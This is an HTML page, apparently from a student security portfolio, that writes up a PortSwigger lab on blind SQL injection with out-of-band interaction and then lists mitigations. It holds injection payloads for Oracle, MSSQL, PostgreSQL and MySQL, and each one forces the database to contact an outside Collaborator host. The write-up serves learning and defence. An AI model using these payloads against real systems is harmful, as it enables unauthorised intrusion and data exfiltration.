@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 16</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>Lab 16</h1>
+        <nav>
+            <ul>
+                <li><a href="pd03.html">← Volver al roadmap</a></li>
+                <li><a href="#lab">Laboratorio</a></li>
+                <li><a href="#procedimiento">Procedimiento</a></li>
+                <li><a href="#evidencia">Evidencia</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- LABORATORIO 16 -->
+    <section id="lab">
+        <h2>Lab16: Blind SQL injection with out-of-band interaction</h2>
+        
+        <table>
+            <tr>
+                <th>Nivel</th>
+                <td>Practitioner</td>
+            </tr>
+            <tr>
+                <th>Tipo de SQLi</th>
+                <td>Blind SQL injection (Out-of-band / OAST)</td>
+            </tr>
+        </table>
+
+        <h3>Objetivo</h3>
+        <p>Provocar una interacción de red externa (DNS) mediante una subconsulta SQL, demostrando la capacidad de realizar consultas fuera de banda (out-of-band) desde la base de datos hacia un servidor controlado por el atacante.</p>
+
+        <h3>Vulnerabilidad</h3>
+        <p>La cookie <strong>TrackingId</strong> es vulnerable a inyección SQL. El servidor no devuelve errores ni cambios en el contenido, pero procesa comandos que permiten invocar funciones de red. Esto hace que los métodos tradicionales (boolean-based o time-based) no sean efectivos o sean muy lentos.</p>
+        
+        <p>Los ataques <strong>out-of-band (OOB)</strong> son una técnica avanzada que se utiliza cuando no hay respuesta directa ni se pueden realizar inferencias por tiempo de manera fiable. El ataque obliga a la base de datos a realizar una solicitud externa (normalmente DNS o HTTP) a un servidor controlado por el atacante.</p>
+        
+        <p>En este laboratorio, el objetivo es simplemente generar una interacción DNS, no extraer datos. La extracción de datos se aborda en el Laboratorio 17.</p>
+        
+        <p><strong>Nota importante:</strong> Este laboratorio requiere la versión <strong>Professional</strong> de Burp Suite, ya que utiliza la funcionalidad <strong>Burp Collaborator</strong> para recibir las interacciones externas. Con la versión Community no es posible completarlo, pero se puede comprender el procedimiento teórico.</p>
+    </section>
+
+    <!-- PROCEDIMIENTO TEÓRICO -->
+    <section id="procedimiento">
+        <h2>Procedimiento (Teórico)</h2>
+        
+        <div style="background-color: #1e293b; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #f59e0b;">
+            <p><strong>Nota:</strong> Al requerir la versión <strong>Professional</strong> de Burp Suite (elemento con el cual no se cuenta en este entorno educativo), no se pueden adjuntar las evidencias prácticas (capturas). A continuación se explica el procedimiento teórico que se seguiría con Burp Collaborator.</p>
+        </div>
+        
+        <ol>
+            <li>
+                <strong>Interceptar la petición</strong> con Burp Proxy que contenga la cookie TrackingId.
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px; margin-top: 10px;">GET / HTTP/1.1
+Cookie: TrackingId=xyz123</pre>
+            </li>
+            <li>
+                <strong>Abrir Burp Collaborator</strong> desde el menú de Burp Suite Professional. Esto genera un subdominio único, por ejemplo: <strong>abcdef12345678.oastify.com</strong>.
+            </li>
+            <li>
+                <strong>Construir un payload</strong> que fuerce a la base de datos a realizar una consulta DNS al subdominio de Collaborator. Dependiendo del motor de base de datos, el payload varía:
+                
+                <p><strong>Para Oracle (usando XXE):</strong></p>
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">TrackingId=xyz' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://abcdef12345678.oastify.com/"> %remote;]>'),'/l') FROM dual--</pre>
+                
+                <p><strong>Para Microsoft SQL Server:</strong></p>
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">TrackingId=xyz'; exec master..xp_dirtree '\\abcdef12345678.oastify.com\file'--</pre>
+                
+                <p><strong>Para PostgreSQL (con extensión dblink):</strong></p>
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">TrackingId=xyz'; CREATE EXTENSION IF NOT EXISTS dblink; PERFORM dblink_connect('host=abcdef12345678.oastify.com');--</pre>
+                
+                <p><strong>Para MySQL (con LOAD_FILE o INTO OUTFILE):</strong></p>
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">TrackingId=xyz' UNION SELECT LOAD_FILE('\\\\abcdef12345678.oastify.com\\file')--</pre>
+            </li>
+            <li>
+                <strong>Inyectar el payload</strong> en la cookie TrackingId y enviar la petición.
+            </li>
+            <li>
+                <strong>Verificar en Burp Collaborator</strong> la recepción de interacciones. En la pestaña de Collaborator deberían aparecer consultas DNS o HTTP provenientes del servidor de la base de datos.
+            </li>
+            <li>
+                <strong>Confirmar la vulnerabilidad</strong> al ver la interacción en Collaborator, lo que demuestra que la base de datos puede realizar solicitudes externas.
+            </li>
+        </ol>
+
+        <h3>Payload de ejemplo (Oracle)</h3>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px; font-size: 1.1rem;">TrackingId=xyz' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://abcdef12345678.oastify.com/"> %remote;]>'),'/l') FROM dual--</pre>
+        
+        <h4>Explicación del payload (Oracle)</h4>
+        <ul>
+            <li><strong>xyz'</strong>: Cierra la cadena original de la cookie TrackingId.</li>
+            <li><strong>UNION SELECT</strong>: Combina la consulta original con una consulta maliciosa.</li>
+            <li><strong>extractvalue()</strong>: Función de Oracle que procesa XML. Se utiliza para forzar una solicitud externa.</li>
+            <li><strong>xmltype()</strong>: Convierte una cadena en tipo XML.</li>
+            <li><strong><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://..."> %remote;]></strong>: Definición de entidad externa XML que fuerza una petición HTTP al servidor del atacante.</li>
+            <li><strong>FROM dual</strong>: Tabla dummy de Oracle necesaria para completar la consulta.</li>
+            <li><strong>--</strong>: Comenta el resto de la consulta original.</li>
+        </ul>
+
+        <h4>Funcionamiento</h4>
+        <p>Cuando la base de datos procesa la función extractvalue(), intenta resolver la entidad externa definida en el XML, lo que genera una petición HTTP (o DNS) al servidor especificado (Burp Collaborator). Esta petición es recibida por el atacante, confirmando la ejecución de código y la capacidad de comunicación externa.</p>
+    </section>
+
+    <!-- EVIDENCIA TÉCNICA -->
+    <section id="evidencia">
+      
+
+        <h3>Verificación del ataque</h3>
+        <p>La vulnerabilidad se confirmaría al observar en Burp Collaborator las siguientes interacciones:</p>
+        <ul>
+            <li>Consultas DNS desde la IP del servidor de la base de datos.</li>
+            <li>Peticiones HTTP al dominio de Collaborator.</li>
+            <li>Registros de conexiones en el cliente de Collaborator.</li>
+        </ul>
+        
+        <p>Esto demostraría que:</p>
+        <ul>
+            <li>Es posible ejecutar comandos SQL arbitrarios.</li>
+            <li>La base de datos tiene conectividad a Internet o a la red interna.</li>
+            <li>Se puede utilizar esta técnica para exfiltrar datos (Laboratorio 17).</li>
+        </ul>
+        
+        <p>Una vez confirmada la interacción, el laboratorio mostraría el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.</p>
+        
+        <div style="background-color: #1e293b; padding: 15px; border-radius: 8px; margin-top: 20px;">
+            <p><strong>Resultado esperado:</strong> El laboratorio se resuelve correctamente al generar la interacción out-of-band, demostrando la capacidad de realizar peticiones externas desde la base de datos.</p>
+        </div>
+    </section>
+
+    <!-- MITIGACIÓN RECOMENDADA -->
+    <section>
+        <h2>Mitigación recomendada</h2>
+        
+        <h4>Consultas Preparadas (Parameterized Queries)</h4>
+        <p>Implementar consultas parametrizadas es la defensa principal. Al usar parámetros, los valores inyectados se tratan como datos y no como parte del código SQL, bloqueando cualquier intento de inyección.</p>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px;">SELECT * FROM tracking WHERE id = ?</pre>
+        
+        <h4>Firewall de Base de Datos</h4>
+        <p>Implementar firewalls de base de datos que bloqueen tráfico saliente no autorizado, especialmente hacia Internet. La base de datos no debería tener acceso a Internet a menos que sea estrictamente necesario.</p>
+        
+        <h4>Deshabilitar Funciones Peligrosas</h4>
+        <p>Deshabilitar o restringir funciones que permiten interacciones externas:</p>
+        <ul>
+            <li><strong>Oracle:</strong> Restringir el uso de UTL_HTTP, UTL_TCP, y funciones XML que permitan entidades externas.</li>
+            <li><strong>Microsoft SQL Server:</strong> Deshabilitar xp_cmdshell, xp_dirtree y otras funciones extendidas.</li>
+            <li><strong>PostgreSQL:</strong> No instalar extensiones como dblink si no son necesarias.</li>
+            <li><strong>MySQL:</strong> Deshabilitar LOAD_FILE y restringir INTO OUTFILE.</li>
+        </ul>
+        
+        <h4>Principio de Menor Privilegio</h4>
+        <p>La cuenta de base de datos utilizada por la aplicación debe tener permisos mínimos. No debería tener acceso a funciones que permiten interacciones de red.</p>
+        
+        <h4>Segmentación de Red</h4>
+        <p>Segmentar la red para que los servidores de base de datos no tengan acceso directo a Internet. Cualquier comunicación externa debe pasar por proxies controlados y monitoreados.</p>
+        
+        <h4>Validación de Entradas</h4>
+        <p>Validar estrictamente el formato del TrackingId. Si sigue un patrón predecible, rechazar cualquier valor que no cumpla con ese patrón.</p>
+        
+        <h4>Web Application Firewall (WAF)</h4>
+        <p>Implementar un WAF que detecte y bloquee patrones de inyección SQL, incluyendo intentos de usar funciones de red y entidades externas XML.</p>
+    </section>
+
+    <!-- REFERENCIA AL DOCUMENTO ORIGINAL -->
+    <section style="background-color: #0f172a; border: 1px solid #334155;">
+      <p><a href="act08-Equipo1.pdf" class="btn-blog" style="margin-top: 10px; display: inline-block;" download>Descargar PDF completo</a></p>
+    </section>
+
+    <!-- NAVEGACIÓN ENTRE LABORATORIOS -->
+    <section style="display: flex; justify-content: space-between; margin-top: 30px;">
+        <a href="pd03-lab15.html" class="btn-blog">← Laboratorio anterior (Lab 15)</a>
+        <a href="pd03-lab17.html" class="btn-blog">Siguiente laboratorio (Lab 17) →</a>
+    </section>
+
+    <footer>
+        <p>  Slugish – Portafolio de Seguridad Informática</p>
+        <p>GitHub: <a href="https://github.com/sluggishpoem" target="_blank">github.com/sluggishpoem</a></p>
+    </footer>
+</body>
+</html>
